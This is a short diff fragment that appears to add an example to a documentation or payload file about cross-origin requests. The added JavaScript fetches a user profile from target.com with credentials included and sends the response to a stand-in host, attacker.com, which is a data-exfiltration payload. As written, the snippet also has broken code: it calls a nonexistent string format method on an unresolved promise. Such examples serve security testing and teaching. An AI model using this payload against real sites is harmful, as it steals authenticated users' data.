@@ -31,6 +31,15 @@ xhr.send(null);
 ```
 
 ```javascript
+fetch("https://target.com/api/user/profile", {
+	credentials: "include"
+})
+.then((response) => {
+	document.location = "//attacker.com/log?key={0}".format(response.text());
+});
+```
+
+```javascript
 fetch(url, {
   credentials: 'include'  
 })
